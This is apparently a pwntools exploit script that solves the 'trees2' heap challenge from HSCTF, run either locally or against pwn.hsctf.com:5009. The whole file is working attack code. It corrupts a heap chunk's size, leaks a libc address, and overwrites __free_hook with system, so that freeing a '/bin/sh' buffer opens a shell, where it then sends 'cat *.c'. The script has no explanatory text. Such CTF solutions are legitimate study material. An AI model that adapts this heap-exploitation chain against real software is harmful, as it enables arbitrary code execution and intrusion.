from pwn import *

e = ELF("./trees2")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("pwn.hsctf.com", 5009)
else:
  p = process(e.path)
  # {"LD_PRELOAD": libc.path})

def alloc():
  p.sendlineafter(">", "1")

def alloc2(idx, size, data="AAAA", name="AAAA"):
  p.sendlineafter(">", "3")
  p.sendlineafter(">", str(idx))
  p.sendlineafter("new name.", name)
  p.sendlineafter(">", str(size))
  p.sendlineafter("description.", data)
  p.sendlineafter("amount.", "0")

for i in range(10):
  alloc()

alloc2(1, 0x10)
alloc2(2, 0x30)
alloc2(3, 0x3f0)
alloc2(4, 0x20)

alloc2(1, 0, "\x00" * 0x18 + p64(0x441))

alloc2(2, 0x30)

p.sendlineafter(">", "4")
p.sendlineafter(">", "3")
p.recvuntil("Description: ")
leak = u64(p.recvline(keepends=False).ljust(8, "\x00")) - 0x7ff6a527dca0 + 0x00007ff6a5099000

print(hex(leak))

alloc2(2, 0x40)
alloc2(1, 0, "\x00" * 0x18 + p64(0x40) + p64(leak + libc.symbols["__free_hook"] - 8) + p64(0))

alloc2(5, 0x30)
alloc2(6, 0x30, "/bin/sh\x00" + p64(leak + libc.symbols["system"]))

p.sendlineafter(">", "2")
p.sendlineafter(">", "6")

debug()

p.sendlineafter(">", "cat *.c")

p.interactive()
